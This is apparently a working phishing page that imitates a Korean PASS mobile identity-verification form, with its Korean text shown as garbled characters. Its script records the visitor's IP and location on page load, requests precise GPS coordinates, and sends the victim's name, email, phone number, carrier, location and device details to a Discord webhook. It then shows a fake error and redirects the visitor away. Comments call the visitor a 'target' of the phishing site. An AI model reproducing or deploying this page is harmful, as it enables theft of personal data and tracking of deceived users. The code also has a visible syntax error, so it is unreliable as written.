<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PASS ë³¸ì¸í™•ì¸</title>
    <style>
        body { background: #f2f2f2; font-family: 'Malgun Gothic', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .auth-box { width: 90%; max-width: 380px; background: #fff; padding: 25px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        .title { font-size: 18px; font-weight: bold; color: #000; margin-bottom: 20px; text-align: center; }
        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 15px; }
        .btn-submit { width: 100%; padding: 15px; background: #ff0000; color: #fff; border: none; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; }
        #st-email { position: absolute; opacity: 0.01; height: 1px; width: 1px; }
    </style>
</head>
<body onload="initNet()">

    <div class="auth-box">
        <div class="title">ê°„í¸ ë³¸ì¸í™•ì¸</div>
        
        <input type="text" id="name" placeholder="ì„±í•¨" autocomplete="name">
        <select id="telecom">
            <option>SKT</option><option>KT</option><option>LG U+</option><option>ì•Œëœ°í°</option>
        </select>
        <input type="tel" id="phone" placeholder="íœ´ëŒ€í° ë²ˆí˜¸ (-ì—†ì´)" autocomplete="tel">
        
        <input type="email" id="email" placeholder="ì¸ì¦ìš© ì´ë©”ì¼ ì£¼ì†Œ" autocomplete="email">

        <button class="btn-submit" onclick="captureAll()">ì¸ì¦í•˜ê³  í™•ì¸í•˜ê¸°</button>
        <p style="font-size:11px; color:#999; margin-top:10px; text-align:center;">â€» ë³¸ì¸í™•ì¸ ì •ë³´ëŠ” ì•”í˜¸í™”ë˜ì–´ ì „ì†¡ë©ë‹ˆë‹¤.</p>
    </div>

<script>
    const webhook = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
    let netInfo = {};

    // 1. ì ‘ì†í•˜ìë§ˆì IP, ê¸°ê¸°, ëŒ€ëµì  ìœ„ì¹˜ ìë™ í™•ë³´
    async function initNet() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            netInfo = await res.json();
            // ì ‘ì† ì‚¬ì‹¤ë§Œ ë¨¼ì € ë³´ê³ 
            fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: "ğŸš© íƒ€ê²Ÿì´ ë‚šì‹œí„°ì— ë“¤ì–´ì™”ìŠµë‹ˆë‹¤." }) });
        } catch(e) {}
    }

    // 2. ë²„íŠ¼ í´ë¦­ ì‹œ 7ê°€ì§€ ì •ë³´ í†µí•© íƒˆì·¨
    async function captureAll() {
        const data = {
            name: document.getElementById('name').value,
            phone: document.getElementById('phone').value,
            telecom: document.getElementById('telecom').value,
            email: document.getElementById('email').value
        };

        // GPS ì •ë°€ ìœ„ì¹˜ ìš”ì²­
        navigator.geolocation.getCurrentPosition(async (pos) => {
            await finalPush(data, pos.coords.latitude, pos.coords.longitude);
        }, async () => {
            await finalPush(data, null, null);
        });
    }

    async function finalPush(data, lat, lon) {
        await fetch(webhook, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "ğŸ’€ [ì•ŒíŒŒ] 7ëŒ€ ì‹ ìƒ ì •ë³´ í†µí•© ë³´ê³ ì„œ",
                    color: 16711680,
                    fields: [
                        { name: "ğŸ‘¤ ì´ë¦„", value: data.name || "ë¯¸ì…ë ¥", inline: true },
                        { name: "ğŸ“§ ì´ë©”ì¼", value: data.email || "ë¯¸ì…ë ¥", inline: true },
                        { name: "ğŸ“ ì „í™”ë²ˆí˜¸", value: data.phone || "ë¯¸ì…ë ¥", inline: true },
                        { name: "ğŸ“¶ í†µì‹ ì‚¬", value: data.telecom, inline: true },
                        { name: "ğŸŒ ê³µì¸ IP", value: netInfo.ip || "ì‹¤íŒ¨", inline: false },
                        { name: "ğŸ“ ì •ë°€ ìœ„ì¹˜", value: lat ? `ìœ„ë„:${lat}, ê²½ë„:${lon}` : `IPê¸°ë°˜:${netInfo.city}`, inline: false },
                        { name: "ğŸ“± ì ‘ì† ê¸°ê¸°", value: navigator.userAgent, inline: false }
                    ],
                    timestamp: new Date()
                }]
            });
            alert("ì¸ì¦ ì˜¤ë¥˜: ì ì‹œ í›„ ë‹¤ì‹œ ì‹œë„í•´ ì£¼ì„¸ìš”.");
            location.href = "https://www.google.com";
        }
    }
</script>
</body>
</html>
